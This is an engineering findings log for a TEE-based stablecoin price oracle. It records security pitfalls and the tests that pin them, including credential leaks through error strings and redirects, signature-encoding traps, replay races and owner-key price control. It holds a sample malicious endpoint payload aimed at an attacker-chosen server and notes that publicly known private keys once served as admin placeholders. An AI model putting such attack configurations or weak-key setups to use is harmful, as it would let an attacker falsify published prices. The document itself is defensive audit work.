# USDX Oracle — Implementation Findings

**Status:** living document · **Last updated:** 2026-08-15

> **Migration note (2026-08).** The on-chain half moved to the upstream generic
> TEE oracle contracts (`TeeOracleInstructionsSender` + `TeeOracleFeedStore`):
> the op type is now `TEE_ORACLE`, the price report is a `FeedUpdate` with an
> `extensionId`/`feedId` binding, and the old `UsdxPriceStore` guards
> (`minPrice`/`maxPrice`, `maxAge`, `paused`) are gone. Where a finding below
> names the old contracts, op types, or store guards, read it against the new
> model in `usdx-oracle-flows.md`. The enclave-side findings — pricing, supply
> quorum, fail-closed behaviour, credential handling — are unchanged.

Findings discovered while implementing the extension, each with the evidence
that established it and the test that now pins it. Design intent lives in
`usdx-oracle-spec.md`; this file records what turned out to be true in practice,
especially where it differs from, or sharpens, the spec.

Every finding below is enforced by a test. If a finding is ever wrong, or
tee-node changes underneath us, a named test fails rather than a price being
quietly mispublished.

| # | Finding | Severity | Pinned by |
| --- | --- | --- | --- |
| 1 | `ActionResult.Log` is public and raw Go errors leak secrets into it | **High** | `internal/failure` (whole package) |
| 2 | A redirect can hand the Hex API key to a third party | **High** | `TestFetch_DoesNotFollowRedirects` |
| 3 | Blind comma-stripping overstates reserves 100× | **High** | `TestParseAmount_LocaleCommaIsNotSilentlyStripped` |
| 4 | tee-node returns `v` as 0/1; OpenZeppelin requires 27/28 | **High** | `TestClaim1_TeeNodeReturnsRecoveryIDNotV` |
| 5 | tee-node applies EIP-191; verifying the bare hash silently misrecovers | **High** | `TestClaim2_MustRecoverAgainstPrefixedHash` |
| 6 | Rounding instead of truncating reports full backing for an under-backed token | **Medium** | `TestCompute_RoundsHalfUp`, `TestCompute_RoundingCannotHideAMaterialShortfall` |
| 7 | The sign wire is base64, not hex | **Medium** | `TestClaim3_WireIsBase64NotHex` |
| 8 | An empty `sourceHealth` map reads as healthy | **Low** | `config.HealthUnknown` |
| 9 | ~~The TEE machine status enum's numeric values are not published~~ **RESOLVED** | **High** | `REQUIRED_TEE_STATUS = TeeStatus.PRODUCTION` (constant) |
| 10 | secp256k1 malleability gives one report two valid signatures | **Medium** | `test_RejectsMalleableSignature` |
| 11 | A `TeeExtensionStateVerifier` is NOT required — the spec is wrong | Info | `register(address(0), …)` in the scaffold |
| 12 | ~~The production entrypoint lands in stub mode silently~~ **RESOLVED** | **High** | `TestStubMode_CannotBeEnteredAccidentally` |
| 15 | The contract owner key can set any RPC host and any threshold — accepted | **High** | `TestAnyHostIsAccepted` |
| 16 | On-chain config recorded what was *sent*, not what a machine *runs* | **High** | `test_RejectsReportFromStaleConfig` |
| 17 | Full audit of every logging and error surface found no sensitive disclosure | Info | §17 audit + the finding-1 tests |
| 18 | The report's target binding was removed pre-launch — deliberate | Info | registry check + governance |
| 19 | Concurrent provisioning bypassed the envelope replay defence entirely | **High** | `TestApplySecret_ConcurrentReplayAdmitsExactlyOne` |
| 20 | The owner could redirect the Hex API key into a URL of their choosing | **High** | `TestSetEndpoints_RejectsBackingCredentialAsProviderSecret` |
| 24 | One RPC provider could rewind the observation to an old block | **High** | `TestRead_OneProviderCannotRewindTheObservation` |
| 25 | Verification proved a key nothing was encrypted to | **High** | `TestBuildRefusesAKeyThatIsNotTheAttestedMachine` |
| 26 | `SET_SECRET` was the one provisioning command with no size bound | **Medium** | `TestApplySecret_RejectsOversizedMessage` |

---

## 1. `ActionResult.Log` is a public surface, and raw errors leak into it

**Severity: High.** Publishes credentials and reserve figures.

Spec §4.1 establishes that `GET /state` is world-readable. `ActionResult.Log` is
a *second* surface with the same exposure and is not called out: it is part of
the wire contract (`extension-contract.md` §4.6, `"error: <message>"` for
status 0), returned to the TEE proxy, and served from its action-result
endpoint.

Go error strings routinely carry exactly what must not appear there. Both of
these were reproduced, not theorised:

```
1. http    -> Get "https://api.htdigitalassets.com/...?apikey=SUPER_SECRET_KEY": dial tcp: ...
2. decimal -> parsing reserves "25,452,544.52": not a decimal
```

The first is `*url.Error`, which embeds the full request URL including any
query-string credential. The second is the sharper one: it embeds **the reserve
figure**, which §4.1 excludes from every public surface. And because Hex's
public endpoint really does return comma-separated values, a naive
`fmt.Errorf("parsing %q: %w", raw, err)` would publish that number on a
predictable, frequently-taken path — not a rare edge case.

**Resolution.** `internal/failure` owns the complete public error vocabulary.
`Failure` has unexported fields and no exported constructor, so a `Failure` can
only be one of the package-level values declared in that one file. Putting a
runtime value into a public error string is a compile error, not a review
finding. `Extension.fail()` takes a `Failure`, never an `error`.

Tests reject any digit, quote, URL, hostname, or credential-word in the
vocabulary, so a careless addition fails CI.

**Consequence for logging.** The detail still matters for debugging, but §4.1
leaves *where Confidential Space logs land and who can read them* unresolved.
Until that is answered, internal logs carry the error class, the source
identifier, and HTTP status only — never the upstream error, the response body,
or any parsed figure. This matches the spec's own instruction to "log the
derived price and error classes only".

---

## 2. A redirect can hand the Hex API key to a third party

**Severity: High.** Discloses the credential that gates the private endpoint.

Go's `http.Client` strips `Authorization` on a cross-host redirect. It does
**not** strip custom headers. WP1 records that the private endpoint's auth
scheme is unconfirmed — it returns 404 rather than 401 without credentials, so
bearer vs `X-API-Key` cannot be distinguished until a key is issued. If it turns
out to be `X-API-Key`, then any upstream able to return a `302` — a compromised
Hex, a hijacked DNS entry, a misconfiguration — receives the key.

**Resolution.** `backing.New()` sets `CheckRedirect` to
`http.ErrUseLastResponse`, disabling redirect-following outright. An API client
has no legitimate reason to follow one. `TestFetch_DoesNotFollowRedirects`
stands up a sink server behind a redirect and asserts the key never arrives.

Related hardening in the same constructor, each with a test:

- **https is required.** Plaintext would expose the key on the wire and let
  anyone on path dictate the reserve figure, and therefore the published price.
- **Source names may not look like URLs.** Names reach `GET /state`, which is
  public; a URL-shaped name would disclose the endpoint and any embedded key.
- **Response bodies are size-capped** at 64 KiB via `io.LimitReader`.

---

## 3. Blind comma-stripping overstates reserves one hundredfold

**Severity: High.** Would mask the depeg the oracle exists to detect.

Spec §WP1 flags the separator difference and warns against blind stripping. The
magnitude is worth stating explicitly, because it determines how the parser must
be written rather than merely how carefully.

Measured 31 Jul 2026, the two endpoints disagree on format:

```
public:  {"value":"25,452,544.52"}   commas, no currency field
private: {"value":"205304.47"}       no commas, currency: "USD"
```

The obvious implementation — delete every comma, then parse — is wrong.
Comma-as-decimal-separator is a real convention: much of Europe writes `1,50`
for one and a half. Stripping turns that into `150`. A hundredfold
overstatement of reserves publishes $1.00 straight through a genuine depeg.

**Resolution.** `internal/observation/decimal` validates grouping structure rather than
deleting characters: a comma is accepted only where a thousands separator can
legally appear (leading group of 1–3 digits, every subsequent group exactly 3).
`1,50` is rejected. Fail closed; never guess what the operator meant.

Also rejected, because `big.Rat.SetString` accepts them and none is a valid
amount: `1/2` (fraction syntax), `1e5` (exponent), signs, whitespace, and
anything over 64 characters.

Amounts parse to `*big.Rat` — exact. Deliberately **not** `shopspring/decimal`:
for an extension whose value proposition is a reproducible, auditable code hash,
a third-party dependency carrying its own rounding semantics is one more thing
an auditor must read and one more thing that can shift under a version bump.
`big.Rat` is covered by the Go compatibility promise. 5.9M fuzz executions, no
failures.

---

## 4. tee-node returns `v` as 0/1; OpenZeppelin requires 27/28

**Severity: High.** Every on-chain verification fails, and the failure misleads.

Verified against `tee-node v0.0.21-0.20260619120252-31fc839ae6d2`, the version
pinned in `go.mod` — not against the spec's summary:

```go
// internal/extension/server/server.go — signWithTeeHandler
msgHash := crypto.Keccak256(signRequest.Message)
signature, err := s.node.Sign(msgHash)

// pkg/utils/crypto.go — Sign
sig, err := crypto.Sign(accounts.TextHash(msgHash), privKey)
```

`crypto.Sign` returns a 65-byte signature whose final byte is a **recovery id of
0 or 1**, per go-ethereum convention. `ecrecover` and OpenZeppelin's
`ECDSA.recover` both require **27 or 28**, and OZ rejects anything else with
`ECDSAInvalidSignature`.

Exactly one side must add 27. If both do, or neither does, every signature
fails.

**Confirmed empirically, not by reading.** `TestClaim1_TeeNodeReturnsRecoveryIDNotV`
reproduces tee-node's exact call chain over 200 messages and asserts the final
byte is always 0 or 1, and that **both** values occur — a single sample could be
0 or 1 by luck and would prove nothing.

**Decision: normalise on the extension side.** `teenode.NormalizeV` adds 27
before the signature leaves the enclave.

Rationale: it keeps `UsdxPriceStore` using stock, unmodified OpenZeppelin —
the version an auditor already knows how to read — rather than a local variant
with a `+27` an auditor must reason about. The cost is that the published
signature is not byte-identical to what `POST /sign` returned, which is recorded
in the payload documentation. `NormalizeV` is idempotent (27/28 passes through
unchanged), so double-application is safe, and it does not mutate its input.

**Status against the current extension:** consistent. The extension does not
call `/sign` yet — `processGetPrice` still returns the stubbed $1.00 — so
nothing was wrong and nothing needed correcting. The normalisation is in place
*before* the signing path is wired, which is the point: this trap is cheap to
prevent now and expensive to diagnose later, because it surfaces on-chain as a
rejected signature rather than as an encoding bug.

---

## 5. tee-node applies EIP-191; verifying the bare hash misrecovers silently

**Severity: High.** Fails in a way that sends an investigator to the wrong place.

From the same source chain: `accounts.TextHash(msgHash)` prepends
`"\x19Ethereum Signed Message:\n32"` before hashing. The digest actually signed
is therefore:

```
keccak256("\x19Ethereum Signed Message:\n32" ‖ keccak256(message))
```

So `UsdxPriceStore` must recover against
`toEthSignedMessageHash(keccak256(body))`, **not** against `keccak256(body)`.

The danger is the failure mode, not the mistake. Recovering against the bare
hash **does not revert** — it returns a well-formed but different address. On
chain that presents as "this TEE is not registered", sending whoever
investigates to `TeeMachineRegistry` and the registration flow rather than to
the hashing. `TestClaim2_MustRecoverAgainstPrefixedHash` asserts both that the
prefixed recovery yields the right address and that the unprefixed one does not.

`TestSignedReportRecoversAfterNormalisation` covers findings 4 and 5 together:
sign the way tee-node does, normalise, then recover the way the contract will.

---

## 6. Truncation is load-bearing, not a style choice

> **⚠ Reversed 5 Aug 2026 — the price now rounds half-up. See finding 21.** The
> reasoning below is why truncation was chosen and is still why the *bound*
> matters; what changed is the measurement that the bound was traded against.
> `TestCompute_TruncatesNeverRounds` is now
> `TestCompute_RoundsHalfUp` plus `TestCompute_RoundingCannotHideAMaterialShortfall`.

**Severity: Medium.** Reports full backing for a token that is not fully backed.

Spec §3.5 specifies rounding down. The reason deserves recording: at 8 decimals,
a backing ratio of `0.999999995` **rounds** to exactly `1.00000000`. That
publishes "fully backed" for a token that is not, which is precisely the
condition the feed exists to surface.

Truncation makes every representable error conservative — the published price is
understated by at most one unit in the last place, never overstated.
`TestCompute_RoundingBoundaryIsExact` uses that exact value.

The par cap is the mirror image: USDX redeems at $1.00, so over-collateralisation
does not make it worth more, and publishing 1.02 would be wrong in a way that
costs someone money. Both properties are fuzzed as invariants over arbitrary
inputs (5.2M executions): the result is never negative and never exceeds par.

`internal/observation/price` is kept **pure** — no I/O, no clock, no configuration, no
policy — which is what makes that fuzzing meaningful and lets an auditor verify
the formula by reading alone. Plausibility bounds and the deviation guard live
in the caller and on-chain respectively; encoding either here would hide a
governance parameter inside arithmetic.

---

## 7. The sign wire is base64, not hex

**Severity: Medium.** Silent misencoding.

`tee-node`'s `SignRequest.Message`, `SignResponse.Signature`,
`DecryptRequest.EncryptedMessage` and `DecryptResponse.DecryptedMessage` are all
Go `[]byte`, and `encoding/json` renders `[]byte` as **base64**. Every other
byte string in FCC is hex, so this is a genuine asymmetry rather than a
convention one can infer.

`TestClaim3_WireIsBase64NotHex` asserts the encoding, and
`TestWireFormatMatchesTeeNode` marshals our locally declared structs alongside
tee-node's and requires byte-identical JSON — so a change on their side breaks a
test rather than the feed.

---

## 8. An empty `sourceHealth` map reads as healthy

**Severity: Low.** Hides a source that silently stopped being polled.

`GET /state` reports `sourceHealth` as a map of source identifier to status.
With no entries it serialises as `{}`, which is indistinguishable from "all
sources fine" to anyone eyeballing it — and once sources exist, an *absent* key
would read the same way.

**Resolution.** `config.HealthUnknown` exists as an explicit value, and every
known source is to be seeded with it at startup so absence is never mistaken for
health. Names are identifiers (`hex_bonds`, `rpc_flare_1`), never URLs, for the
disclosure reason in finding 2.

**Still open:** granularity. The natural key is per-chain, but the design reads
three RPC providers per chain with 2-of-3 agreement, so `rpc_flare: "ok"` hides
one-of-three being down — exactly the state worth seeing *before* the second one
goes and quorum fails. Per-provider keys disclose how many providers are
configured, though not which. WP7.4 wants per-provider health for monitoring.
Not yet decided.

---

## 9. The TEE machine status enum's values are not published

**Severity: High.** Blocks correct mainnet deployment. **Unresolved — needs an answer.**

`UsdxPriceStore` must reject a signer that is registered to this extension but
has since been revoked. `MachineManager` exposes
`getTeeMachineStatus(address) -> uint8`, but the ABI types the return as a bare
`uint8`: the enum's member names and numeric values do not survive into the
published Go bindings, and nothing in this repo or `go-flare-common` records
them.

Guessing is worse than either outcome it produces. Guess too low and revoked
machines keep publishing prices indefinitely. Guess too high and every
submission reverts, which is a total feed outage that would only be discovered
after deployment.

**RESOLVED.** Read from source —
`flare-smart-contracts-v2/contracts/userInterfaces/tee/IMachineManager.sol`:

```solidity
enum TeeStatus { NONE, INITIALIZED, PRODUCTION, SUSPENDED, PAUSED, BANNED }
```

So `PRODUCTION == 2`. Confirmed independently on Coston2: the live machine
`0x2ab1a473…` reports status 2 and appears in `getActiveTeeMachines(0x10193)`.

The enum is restated on `ITeeMachineRegistry` and `REQUIRED_TEE_STATUS` is now
the constant `uint8(TeeStatus.PRODUCTION)` rather than a constructor parameter.
Only one value is ever correct, so a parameter was a footgun — and it fired: the
Coston2 store was deployed with `1`, which is `INITIALIZED`, meaning it rejects
every production machine while accepting one that registered but was never
promoted via `toProduction()`.

**Note for the deployment checklist:** the earlier reading of the spec prose
(`docs`, "Machine statuses") put `paused` at 1. That ordering does not match the
enum. Trust the source, not the prose.

`NONE == 0` also answers the sub-question about unknown machines: a machine that
was never registered reports `NONE`, so the status comparison alone rejects a
stranger, independently of the `getExtensionId` check.

---

## 10. secp256k1 malleability gives one report two valid signatures

**Severity: Medium.** Breaks "one report, one signature" for anything keying off
signature bytes.

For any valid `(r, s, v)` there is an equally valid `(r, n − s, v ^ 1)` that
recovers the same signer. An observer who sees a submitted report can therefore
mint a second, byte-distinct signature for it without any key material.

Strict `observedAt` monotonicity already makes a replay harmless *in this
contract* — the second submission is rejected as not-newer regardless. But the
property is worth enforcing rather than relying on: a keeper deduplicating by
signature hash, or any future consumer that treats the signature as an
identifier, would be wrong in a way that is hard to see.

**Resolution.** `_recover` rejects the high-`s` form outright, the same rule
OpenZeppelin applies. One accepted representation means one code path to audit.

---

## 11. A `TeeExtensionStateVerifier` is not required

**Severity: informational.** Removes a planned work item.

Spec §WP4.3 lists "`TeeExtensionStateVerifier` — required by `register()`;
scaffold has none" as a task. Observed behaviour contradicts it:
`tools/cmd/register-extension/main.go` passes `common.Address{}` as the state
verifier and registration succeeds — the scaffold's whole end-to-end flow runs
that way.

A state verifier exists to validate the extension's attested `GET /state`
on-chain. This design does not need one: the price reaches the chain through the
signed-report path into `UsdxPriceStore`, and `/state` carries only operational
health that nothing on-chain consumes.

**No contract was written.** If a future design wants attested state on-chain,
this decision should be revisited — but building one now would be unused code in
an audited codebase.

---

## 12. The production entrypoint still serves a hard-coded price

**Severity: High.** **Resolved 2026-08-03.**

Found by auditing the call graph rather than by a failing test, which is why it
is worth recording: every check was green while this was true.

    cmd/docker/main.go
      -> extserver.StartExtension(port, signPort)
      -> extension.New(extensionPort, signPort)
      -> NewWithObserver(..., nil)          // observer == nil
      -> stub mode

Nothing anywhere constructs an `oracle.Runner`. The observation path is complete
and tested, but no code assembles it, because that needs configuration which
does not exist yet: RPC endpoints per chain, Hex endpoint URLs, injected
credentials, the store address, the feed id. There is no config loader.

The reason this is High rather than a to-do: **a hard-coded par price is the one
failure mode that raises no alarm.** No error, no failure counter, no stale
timestamp, no unhealthy source. A feed frozen at exactly $1.00 is
indistinguishable from a healthy, fully-backed one — precisely the state the
monitoring in WP7 is designed to detect, and precisely the state it cannot see.

**Resolution.** Three changes, in order of how much they matter:

1. **`extension.New()` was deleted.** That constructor was the actual defect: it
   read as the ordinary way to build an extension while silently producing a
   stub.
2. **`server.StartExtension` loads the embedded config and refuses to start
   without it.** There is no fallback to stub on error — falling back would
   reintroduce the exact failure, just later.
3. **A nil observer is now unconstructible.** An interim fix logged a six-line
   banner at `ERROR` level, but inside a TEE the logs cannot be read from
   outside, so a banner is not a defence. The production constructors
   (`NewWithObserver`, `NewWithProvisioner`) now **panic** on a nil observer,
   and the only stub path is `extension.NewStub`, called at exactly one site:
   `./cmd`, the binary used by `test-conformance.sh`, which has no credentials
   by design. `./cmd/docker` is production and is what `Dockerfile` builds.
   `Extension.StubMode()` remains exposed for health checks.

**Still true:** the two modes emit different wire formats, so conformance
fixtures pin the stub's JSON rather than the production ABI payload. Regenerating
them against the real path needs a running signer, and `observedAt` becomes
wall-clock — the byte-exact `data` assertions must become structural at that
point. `TestStubMode_PayloadDiffersFromObserverPayload` keeps the divergence
visible until then.

**Related: the two modes emit different wire formats.** Stub mode returns JSON
(`GetPriceResponse`); observer mode returns `abi.encode(body, signature)`. The
conformance fixtures were generated in stub mode, so **they pin the stub's format
and not the production payload** — conformance currently gives less assurance
than its green result suggests.
`TestStubMode_PayloadDiffersFromObserverPayload` asserts the divergence rather
than letting it be discovered later. Resolving finding 12 means regenerating the
fixtures against the real path, at which point `observedAt` becomes wall-clock
and the byte-exact `data` assertions must become structural.

**Remaining:** regenerate conformance fixtures against the real payload → E2E on
Coston2.

---

## 13. The deployment ordering has no circularity

**Severity: informational.** Corrects an error in an earlier draft of this
document.

The original concern: while the signed report bound the store address, the
store had to be pinned in the extension's embedded config — which appeared to
require the store before the image, while the store's constructor needs
`EXTENSION_ID`, which appeared to require a registered extension and therefore
a running TEE. That reasoning was wrong even then, and the binding has since
been removed (pre-launch), so the ordering constraint no longer exists at all:
the store address is not part of the extension image.

**Registering an extension does not require a running TEE machine.** Only
registering a *machine* does. The scaffold's lifecycle already separates them:

    pre-build.sh        deploy InstructionSender, register extension -> EXTENSION_ID
    extension-setup.sh  deploy UsdxPriceStore + UsdxCustomFeed -> record addresses
    start-services.sh   build image -> code hash
    post-build.sh       register the TEE machine

`extension-setup.sh` is a hook the scaffold already provides, and it runs exactly
between the two. One build pass, no CREATE2, no provisional image. The earlier
two-phase-build proposal solved a problem that does not exist.

`deploy/scripts/extension-setup.sh` deploys both contracts; `deploy-store` records the
addresses in the deployed-addresses file. It skips deployment if one is already
recorded there, since redeploying resets the stored price and the `observedAt`
high-water mark — `FORCE_REDEPLOY_STORE=1` overrides.

---

## 14. Configuration arrives at runtime; only the un-substitutable parts stay baked

**Severity: informational.** Records a design change and the reasoning, since it
reverses an earlier implementation.

An earlier build embedded RPC endpoints in the image and read credentials from
`SECRETS_CIPHERTEXT` at startup. Both now arrive after boot:

| | Was | Now |
| --- | --- | --- |
| Endpoints | Embedded JSON, code-hash pinned | On-chain `USDX_CONFIG`/`SET_ENDPOINTS` |
| Credentials | `SECRETS_CIPHERTEXT` env at startup | Direct `USDX_CONFIG`/`SET_SECRET`, M-of-N signed envelope |
| Lifetime | Immutable after startup | Memory-only, lost on restart |
| Rotation | Rebuild or restart | Instant, no gas, no restart |

**Why endpoints go on-chain.** Publishing which RPC providers are read is the
point — it is what makes the data sources verifiable rather than merely
asserted.

**Why credentials go by direct instruction.** No gas, no permanent public record
of a ciphertext, instant rotation, and no secret-handling path in Solidity.

**What still had to stay baked**, because moving it would have made the
attestation meaningless:

- **The host allowlist** — *superseded, see §15*. Baked at this point because,
  without it, on-chain endpoint configuration is itself a substitution channel:
  whoever can set endpoints can point a chain at a server they control and
  dictate the price. It was later removed so providers can be rotated without a
  rebuild, and the resulting owner-key trust is accepted explicitly in §15.
- ~~**The admin signer set**~~ — *superseded*. It was baked at this point as the
  root of trust for provisioning. It is now published by
  `SET_ADMINS`, owner-only, recorded per feed in `latestAdminsHash` and enforced by the
  store against the signed report. Baking it bought nothing the owner key did
  not already have (see §15) and cost a rebuild per rotation; publishing it makes
  "who could provision this machine" answerable from the chain. See
  rationale §9.
- **The observation window**, since widening it weakens the TOCTOU bound.

(The signed report's target binding — chain id, store, feed id — was removed
pre-launch; acceptance is anchored by the store's registered-machine check.
See §16.)

### Properties worth knowing

**Each command is valid over exactly one channel, enforced not assumed.**
`SET_ENDPOINTS` and `SET_ADMINS` are instruction-only: their authorisation is the
owner-only check in the on-chain sender, which a direct action would bypass
entirely. `SET_SECRET` is direct-only: a credential ciphertext has no business in
permanent public storage. The handler checks `action.Data.Type` — which the
scaffold's dispatch ignored completely.

**A published admin set is enforced end to end.** `setAdmins` records
`latestAdminsHash`, the extension commits to `adminsHash` inside the signed
body, and the store rejects any mismatch with `StaleAdmins`. Rotating admins
therefore withdraws a machine's commissioning until it lands a price under the
new set — the same self-announcing behaviour republishing endpoints already had.

**Two signer sets, split by exposure rather than by importance.** The envelope's
ref selects the set: `hex_api_key` is authorised by `backing` (1-of-N permitted),
everything else by `providers` (2-of-N minimum). The asymmetry is deliberate and
worth restating plainly, because it looks backwards at first glance — the
*better-protected* credential gets the *weaker* threshold. The reasoning is
impact, not exposure: the backing endpoint is pinned and authenticated by header,
so a wrong value degrades the feed to cash-less rather than moving the price,
whereas a provider credential is substituted into a URL the owner key chooses.
**If the backing endpoint ever stops being pinned, `MinBackingThreshold` must go
back up.** The ref-to-set mapping is pinned in the build, never in the payload;
otherwise the 1-of-1 key could claim the provider credentials.

**One rejection reason for everything.** Bad signature, too few distinct signers,
unknown signer, stale `issuedAt`, replayed version, wrong `teeId`, wrong chain,
wrong domain, undecryptable ciphertext — all return
`failure.ProvisionRejected`. Distinguishing them would turn provisioning into an
oracle for probing the admin set, the freshness window, and which machine is
which. `TestVerify_AllRejectionsAreIndistinguishable` holds that line.

**`version` and `issuedAt` are complementary, not redundant.** `version` is
in-memory and blocks rolling a secret back while the process lives. `issuedAt`
(one hour) survives restarts, where the version counter resets to zero and
would otherwise let a captured envelope be replayed indefinitely. That window is
the whole of the post-restart defence, so it is sized by that risk and not by
signing convenience.

**Distinct signers.** One compromised key signing M times must not satisfy an
M-of-N threshold; recovered addresses are deduplicated.
`TestVerify_RejectsDuplicateSignerReachingThreshold`.

**A rejected update leaves the working configuration in place.** A bad
`SET_ENDPOINTS` must not take a live feed down.

### Design bug caught while building

`secretRef` was initially one field serving two purposes: substitution into a
`{secret}` URL placeholder, and the value of an auth header. Those are different
cases — the Hex private endpoint authenticates by header with no placeholder,
while a keyed RPC URL has a placeholder and no header — and one field could not
express both without validation rejecting one of the two real configurations.
Split into `URLSecretRef` and `AuthSecretRef`.

### Resolved: the baked placeholder admin set

The admin set used to be baked into the image, and the baked value was the
addresses of **private keys 1, 2 and 3**:

```
0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf   privkey 0x01
0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF   privkey 0x02
0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69   privkey 0x03
```

Those are the most widely known keys in existence, so anyone could produce two
valid admin signatures, and the M-of-N threshold provided no protection whatever.
`TestAdminSetIsNotPlaceholder` skipped with a warning and was to become a hard
failure once real keys were baked.

The fix was not to bake different keys. The set is now **published per machine**
by the owner-only `SET_ADMINS` instruction, and a verifier starts with none —
`TestVerify_RejectsBeforeAnyAdminSetIsInstalled` holds that line. A machine that
has not been told who its admins are cannot be provisioned at all, so there is no
longer a guessable default to be wrong about. The same addresses survive as an
explicitly named test fixture, `deploy/config/admins/dev-wellknown-keys.json`, which
is inert unless someone deliberately publishes it to a machine.

`TestAdminSetIsNotPlaceholder` is gone with the constant it guarded.

**Corrected 5 Aug 2026.** This section previously described the placeholders as
`0x1111…`, `0x2222…`, `0x3333…`. They were not, and the old wording understated
the risk in the safe-sounding direction: `0x1111…` has no known private key, so
provisioning would have failed closed, whereas the real values failed open.

---

## 15. The owner key is price-controlling, by decision

**Severity: High. Accepted deliberately — this is a recorded trade, not a defect.**

`SET_ENDPOINTS` carries RPC provider URLs and a per-chain agreement threshold,
both unconstrained. An earlier build bounded URLs with a baked host allowlist
and pinned the threshold; both were removed so that adding a provider (Alchemy,
say) or moving from 2-of-3 to 2-of-4 needs no rebuild and no re-attestation.

**The consequence.** `setEndpoints` is `onlyOwner`, so whoever holds that key
can send `{"threshold": 1, "providers": [{"url": "https://their-server/"}]}`,
have that server return any `totalSupply()`, and the attested code will
faithfully compute and sign the resulting price. A higher threshold does not
help, because the same party chooses every provider in the list.

So the published price is only as trustworthy as the **contract owner key**, not
as the code hash alone. The attestation still proves which code ran and that the
credentials stayed in the enclave; it no longer proves the inputs came from
anywhere in particular. Anyone relying on this feed has to trust the owner as
well as the TEE.

**What this rules out.** The original claim in spec §2 — that consumers can
verify *what* computed the price rather than trusting an operator — is now only
half true. Worth restating in consumer documentation rather than leaving the
spec's stronger wording in place.

**What is still enforced**, and is unrelated to which host is named:

- https only, so a credential is never put on the wire in plaintext and nobody
  on path can dictate a supply figure
- `{secret}` may not appear in a URL's scheme or host, so the credential holder
  cannot change the destination even though the URL author can
- a credential containing `/ ? # &` or whitespace is rejected, so substitution
  cannot restructure a URL
- the backing credential (`hex_api_key`) may not be named as a provider secret,
  so the URL author cannot choose a destination for the one credential whose
  destination is otherwise pinned — see finding 20
- threshold must be between 1 and the provider count, so a chain cannot be
  configured to fail on every observation
- every pinned chain must be present, since a missing one undercounts supply and
  therefore *overstates* the price
- token addresses, finality tag and margin, decimals, the Hex endpoints and the
  observation bounds remain pinned and are not expressible in a payload

**Mitigations available if the trade is later reconsidered:** put the owner
behind a multisig or timelock; or pin a per-chain *minimum* threshold so the
runtime value can only be raised; or reinstate the host allowlist.
`TestAnyHostIsAccepted` exists so that reintroducing a constraint means changing
a named test rather than silently altering behaviour.

---

## 18. The report's target binding was removed pre-launch

**Severity: informational. A deliberate simplification, recorded so the absence
is a documented decision rather than an oversight.**

The signed report originally carried `chainId`, `store` and `feedId`, and the
store verified each against itself. All three were removed before launch. The
payload is now `(domain, price, decimals, observedAt, instructionId)`.

**Why they were weaker than they looked.** The store's acceptance gate is the
registered-machine check: a signature is only ever accepted from a TEE machine
currently registered to the store's extension. That check proves the price was
computed by attested code from the configured sources regardless of what the
payload binds. The binding fields never protected the price itself — only
*where a correctly-signed price could be delivered*:

- `feedId` was redundant outright: the store binding already determined the
  destination. (`FEED_ID` was subsequently removed from the store as well — see
  the note at the end of this finding.)
- `store` blocked replay into other deployments under the same extension id —
  including deployments governance did not intend — but such a replay still
  delivers a genuine TEE price, never a forged one.
- `chainId` blocked cross-chain replay, which additionally requires a machine
  key to be registered in two networks' registries — a platform invariant the
  deployment model (one chain per machine) already makes unlikely.

**What is accepted in exchange.** Two operational invariants, carried by
governance rather than enforced by the contract: one intended store deployment
per extension (a second deployment under the same extension id accepts the
same genuine reports until paused), and machine keys staying on one network.
Nobody can publish a wrong price either way.

**What changed with it.** The store address left the extension's embedded
config (schema v5 drops `target`; the chain id stays, because provisioning
envelopes still bind to it), `extension-setup.sh` no longer writes a deployed
address into the config (`deploy-store` records it in the deployed-addresses
file instead), and the image no longer needs the store deployed before it is
built.

**Follow-up: `FEED_ID` removed from the store too.** It was written in the
constructor and never read there; its only consumer anywhere was a
`FeedMismatch` guard in `UsdxCustomFeed`'s constructor. That guard could not
earn its keep. `FtsoV2.addCustomFeeds` and `FtsoV2.replaceCustomFeeds` take no
feed id argument — both read `feedId()` off the contract being registered — so
the adapter is the sole authority on the id and the store's copy was never
consulted by anything. The guard would have caught a mistyped id, which FtsoV2
already rejects loudly at the governance step (`"feed does not exist"`), while
missing the failure that actually matters: an adapter deployed against the
*wrong store* with the right id passes the id check and silently serves another
store's price. That belongs in `verify-deploy` as a `newFeed.STORE()` assertion
before the governance proposal, not in a constructor. Removing it also unblocks
a second adapter over one store under a different id, which the check forbade.

---

## 17. Full audit of logging and error surfaces (2026-08-04)

**Severity: informational. No sensitive disclosure found. Records what was
checked so the next reviewer starts from a known baseline rather than
re-auditing from scratch.**

Finding 1 built the mechanism. This audit walked every site that emits
anything — every `logger` call, every error return, every HTTP response body,
every contract event — to confirm the mechanism is complete and nothing beside
it leaks.

**Scope and verdict, surface by surface.**

- *Internal logging.* The runtime extension imports `logger` in exactly three
  files: `extension.go`, `provisioning.go`, `utils.go`. The packages that
  actually touch secrets and reserve figures — `backing`, `supply`, `price`,
  `observation/decimal`, `wire/feedupdate`, `provisioning/envelope`, `provisioning/store`, `teenode` — import no logger
  at all, so the sensitive values have no log path to reach. What the three
  files log is: action IDs, statuses, the vocabulary `Log`, port numbers, the
  stub-mode banner, `SET_ENDPOINTS` validation detail (chain names, thresholds
  and secret *ref names* — all public on-chain or names rather than values),
  and the fixed string `SET_SECRET rejected` with deliberately no cause.
- *ActionResult.Log.* Every path reaches it through `Extension.fail()`, whose
  parameter type is `failure.Failure`, not `error` — a raw error cannot be
  passed in even by accident. `asFailure()` sanitises at the extension and
  oracle boundaries. Pinned by `TestProcessGetPrice_ForeignErrorIsNotPublished`
  (an injected `dial tcp …?apikey=SECRET` error surfaces as `internal error`)
  and `TestVocabularyIsPublishable` (rejects digits, URLs, hostnames, quotes
  and credential-words in the vocabulary).
- *GET /state.* Carries last price, timestamps, counters, the coarse error
  class, readiness (secret ref *names*, never values) and per-source health
  keyed by non-URL identifiers (`backing.New` rejects URL-shaped names).
- *Signing/decrypt round trips.* `teenode.post` returns vocabulary values
  only; the failed-decrypt response body is dropped because it could carry key
  material. `backing.fetchOnce` drops the `*url.Error` that embeds the request
  URL with any query-string credential. `decimal` errors never quote their
  input, and the input is dropped anyway, because the input is the reserve
  figure.
- *Contract events and reverts.* Events carry the price (the intended public
  output), timestamps, addresses, and `keccak256(config)` — the hash, not the
  endpoint config. Revert strings are constants. The endpoint payload itself
  is public by construction (it arrives by on-chain instruction) and carries
  URLs with `{secret}` placeholders and ref names, never credential values.
